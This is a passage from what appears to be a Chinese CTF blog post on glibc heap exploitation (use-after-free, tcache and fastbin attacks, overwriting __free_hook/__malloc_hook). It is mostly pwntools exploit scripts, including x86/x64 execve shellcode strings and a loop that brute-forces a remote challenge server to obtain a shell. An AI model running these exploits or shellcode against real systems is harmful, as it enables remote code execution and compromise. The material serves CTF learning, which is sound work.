class="string">"libc-2.31.so"</span>)</span><br><span class="line"><span class="comment"># p = remote("node4.buuoj.cn", 28139)#nc 124.71.130.185 49155</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span> </span><br><span class="line">    debug_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">'b *&#123;&#125;\n'</span>.format(hex(text_base+i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">'b *&#123;&#125;\n'</span>.format(hex(i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send((data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), (data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline((data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), (data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line">li      = <span class="keyword">lambda</span> str1,data1         :log.success(str1+<span class="string">'========&gt;'</span>+hex(data1))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbgc</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b*"</span> + hex(addr) +<span class="string">"\n c"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x86_20=<span class="string">"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x64_21=<span class="string">"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,con)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me its size: \n"</span>,str(sz))</span><br><span class="line">    sa(<span class="string">"Content: "</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: \n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: \n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: \n"</span>,str(idx))</span><br><span class="line">    sla(<span class="string">"Please tell me its content: \n"</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(p)</span>:</span></span><br><span class="line">    <span class="comment">#debug([0x7B9])</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'b'</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'c'</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'d'</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'f'</span>)<span class="comment">#4</span></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_base=uu64(r(<span class="number">8</span>))<span class="number">-0x360</span></span><br><span class="line">    lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">0x80</span>,p64(heap_base+<span class="number">0x10</span>))<span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'\x00'</span>*<span class="number">12</span>+<span class="string">'\xff'</span>*<span class="number">4</span>)<span class="comment">#6</span></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    show(<span class="number">3</span>)</span><br><span class="line">    main_arena=uu64(r(<span class="number">8</span>))<span class="number">-96</span></span><br><span class="line">    malloc_hook=main_arena<span class="number">-0x10</span></span><br><span class="line">    lg(<span class="string">"malloc_hook"</span>,malloc_hook)</span><br><span class="line">    libc_base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">    system=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    free=libc_base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    lg(<span class="string">"system"</span>,system)</span><br><span class="line">    lg(<span class="string">"free"</span>,free)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'a'</span>)<span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'c'</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    edit(<span class="number">9</span>,p64(free))</span><br><span class="line">    add(<span class="number">0x50</span>,<span class="string">'d'</span>)<span class="comment">#10</span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    add(<span class="number">0x50</span>,p64(system))</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    it()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp(p)</span><br></pre></td></tr></table></figure>



<h2 id="libc-2-33-UAF-chunk-size-lt-0x80"><a href="#libc-2-33-UAF-chunk-size-lt-0x80" class="headerlink" title="libc-2.33 + UAF + chunk_size&lt;=0x80"></a>libc-2.33 + UAF + chunk_size&lt;=0x80</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># context.terminal=['tmux', 'splitw', '-h']</span></span><br><span class="line">prog = <span class="string">'./ezuaf'</span></span><br><span class="line">elf = ELF(prog)</span><br><span class="line"><span class="comment"># p = process(prog)#,env=&#123;"LD_PRELOAD":"./libc-2.23.so","LD_PRELOAD":"./ld-2.33.so"&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">"libc-2.33.so"</span>)</span><br><span class="line"><span class="comment"># p = remote("node4.buuoj.cn", 29464)#nc 124.71.130.185 49155</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span> </span><br><span class="line">    debug_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print &#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">'b *&#123;&#125;\n'</span>.format(hex(text_base+i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">            debug_str+=<span class="string">'b *&#123;&#125;\n'</span>.format(hex(i))</span><br><span class="line">        gdb.attach(p,debug_str) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send((data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), (data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline((data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), (data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line">li      = <span class="keyword">lambda</span> str1,data1         :log.success(str1+<span class="string">'========&gt;'</span>+hex(data1))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbgc</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b*"</span> + hex(addr) +<span class="string">"\n c"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span><span class="params">(s,addr)</span>:</span></span><br><span class="line">    print(<span class="string">'\033[1;31;40m%20s--&gt;0x%x\033[0m'</span>%(s,addr))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x86_20=<span class="string">"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">sh_x64_21=<span class="string">"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">": "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(sz,con)</span>:</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me its size: "</span>,str(sz))</span><br><span class="line">    sa(<span class="string">"Content: "</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: "</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: \n"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Please tell me the index: \n"</span>,str(idx))</span><br><span class="line">    sla(<span class="string">"Please tell me its content: \n"</span>,con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(p,i)</span>:</span></span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'a'</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    heap_leak=uu64(r(<span class="number">6</span>))</span><br><span class="line">    heap_base=heap_leak*<span class="number">0x1000</span></span><br><span class="line">    lg(<span class="string">"heap_base"</span>,heap_base)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">"arttnba3arttnba4"</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,p64(heap_leak^(heap_base+<span class="number">0x10</span>)))</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">'arttnba3'</span>)</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">"\x00\x00"</span>*(<span class="number">0xe</span>+<span class="number">0x10</span>+<span class="number">9</span>)+<span class="string">'\x07\x00'</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x40</span>,(<span class="string">'\x00\x00'</span>*<span class="number">3</span>+<span class="string">'\x01\x00'</span>+<span class="string">'\x00\x00'</span>*<span class="number">2</span>+<span class="string">'\x01\x00'</span>).ljust(<span class="number">0x70</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    add(<span class="number">0x30</span>,<span class="number">0x30</span>*<span class="string">'\x00'</span>)</span><br><span class="line">    add(<span class="number">0x10</span>,p64(<span class="number">0</span>)+<span class="string">'\xc0'</span>+p8(i*<span class="number">0x10</span>+<span class="number">6</span>))</span><br><span class="line">    add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    libc_base=uu64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:])<span class="number">-0x1e4744</span>+<span class="number">0x3000</span></span><br><span class="line">    lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">    <span class="comment"># dbg()</span></span><br><span class="line">    add(<span class="number">0x10</span>,p64(libc_base+libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    add(<span class="number">0x70</span>,p64(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    it()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># exp(p)</span></span><br><span class="line">    count=<span class="number">1</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"the no."</span>+str(count)+<span class="string">"try"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">"try: "</span>+<span class="string">'\xc0'</span>+p8(i*<span class="number">0x10</span>+<span class="number">6</span>)</span><br><span class="line">            p = remote(<span class="string">"node4.buuoj.cn"</span>, <span class="number">29464</span>)</span><br><span class="line">            <span class="comment"># p=process("./ezuaf")</span></span><br><span class="line">            pwn(p,i)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> e</span><br><span class="line">            p.close()</span><br><span class="line">            i=i+<span class="number">1</span></span><br><span class="line">            count=count+<span class="number">1</span></span><br><span class="line">            i=i%<span class="number">16</span></span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>



<p>下面部分主要来自<a href="https://bbs.pediy.com/user-home-904686.htm" target="_blank" rel="noopener">PIG-007</a>大佬，参考（抄）下来</p>
<h2 id="PWN堆Heap总结UAF专场"><a href="#PWN堆Heap总结UAF专场" class="headerlink" title="PWN堆Heap总结UAF专场"></a>PWN堆Heap总结UAF专场</h2><p>UAF，异或加密，hook利用</p>
<p>一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。</p>
<p> 这里就2.23~2.32版本的UAF做个总结利用，各个条件的缩减。</p>
<h3 id="一、Glibc2-23"><a href="#一、Glibc2-23" class="headerlink" title="一、Glibc2.23"></a>一、Glibc2.23</h3><h4 id="1-UAF-Leak-Size不做限制："><a href="#1-UAF-Leak-Size不做限制：" class="headerlink" title="1.UAF + Leak + Size不做限制："></a>1.UAF + Leak + Size不做限制：</h4><p>这种情况直接free进unsortedbin泄露地址，然后打fastbin attack，借助0x7f字节错位劫持malloc_hook即可，没啥技术含量。这里再说一些，其实0x56也是可以的，可以借助unsortedbin attack将堆地址写到一个地方然后字节错位也是可以的。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_AAGTKXJQFWS9ZNW.jpg" alt="img"></p>
<p>0x7f：0 1 1 1   1 <strong>11</strong> 1</p>
<p> 0x56：0 1 0 1   0 <strong>11</strong> 0</p>
<p> 主要看的是AM位，加粗的两位，不能刚好是10，检测：</p>
<p> (1)是否属于当前线程的main_arena</p>
<p> (2)是否是mmap出来的chunk的检测</p>
<p> 所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的。而对于堆地址的随机性，0x56和0x55都是可能的，所以也不一定成功，同样需要爆破。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"> </span><br><span class="line">one_gadget = getOnegadget()</span><br><span class="line">add_malloc(<span class="number">0x418</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64Leakbase(<span class="number">88</span> + libc.sym[<span class="string">'main_arena'</span>])</span><br><span class="line">lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x8</span>,p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(one_gadget)):</span><br><span class="line">    lg(<span class="string">"one_gadget["</span>+str(i)+<span class="string">"]"</span>,libc_base+one_gadget[i])</span><br><span class="line">add_malloc(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(libc_base+one_gadget[]))</span><br><span class="line"><span class="comment">#add_malloc(0x18,'PIG007NB')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>需要注意的是这里由于覆写了_IO_wide_data部分数据，有些数据可能打印不出来，直接一股脑发送信息申请堆块即可。至于one_gadget没办法用的，参照realloc_hook调整栈帧。</p>
<h4 id="2-UAF-Leak-size限制"><a href="#2-UAF-Leak-size限制" class="headerlink" title="2.UAF + Leak + size限制"></a>2.UAF + Leak + size限制</h4><p>▲比如说size限制不能申请0x70大小的堆块，那么就没办法字节错位申请malloc_hook的地方。一般来说有以下几种情况：</p>
<p> (1)只能是小Chunk，即0x20~0x80：</p>
<p> 泄露heap地址，修改FD，指向上一个chunk来修改size，释放进入unsortedbin后泄露得到libc地址，之后再借用0x7f的UAF字节错位申请即可到malloc_hook即可。</p>
<p> (2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。</p>
<p> 泄露地址后，直接用unsortedbin attack，修改global_max_fast，然后利用fastbinY链在main_arean上留下size，申请过去修改top_chunk为malloc_hook-0x10或者malloc_hook-0x28，修复unsortedbin之后即可任意修改。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"> </span><br><span class="line">one_gadget = getOnegadget()</span><br><span class="line">main_arena = libc.sym[<span class="string">'main_arena'</span>]</span><br><span class="line">fastbinsY = main_arena + <span class="number">8</span></span><br><span class="line">target_addr = main_arena + <span class="number">80</span></span><br><span class="line">idx = (target_addr - fastbinsY) / <span class="number">8</span></span><br><span class="line">size = idx * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">add_malloc(size<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(<span class="number">0x2f8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(<span class="number">0xf8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64Leakbase(unsortedBinIdx + libc.sym[<span class="string">'main_arena'</span>])</span><br><span class="line">lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">main_arena = libc_base + libc.sym[<span class="string">'main_arena'</span>]</span><br><span class="line">target_addr = libc_base+libc.sym[<span class="string">'global_max_fast'</span>]</span><br><span class="line"> </span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x18</span>,p64(<span class="number">0x0</span>)+p64(target_addr<span class="number">-0x10</span>))</span><br><span class="line">add_malloc(<span class="number">0x2f8</span>,<span class="string">'\x00'</span>)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x8</span>,p64(size+<span class="number">0x10</span>+<span class="number">1</span>))</span><br><span class="line">add_malloc(size<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(libc_base + libc.sym[<span class="string">'main_arena'</span>] + <span class="number">0x48</span>))</span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,p64(malloc_hook<span class="number">-0x28</span>)+p64(<span class="number">0x0</span>)+p64(main_arena+<span class="number">88</span>)*<span class="number">2</span>)</span><br><span class="line">add_malloc(<span class="number">0x98</span>,p64(<span class="number">0x0</span>)*<span class="number">2</span>+p64(libc_base + one_gadget[<span class="number">1</span>])+p64(libc_base+libc.sym[<span class="string">'realloc'</span>]+<span class="number">8</span>))</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span 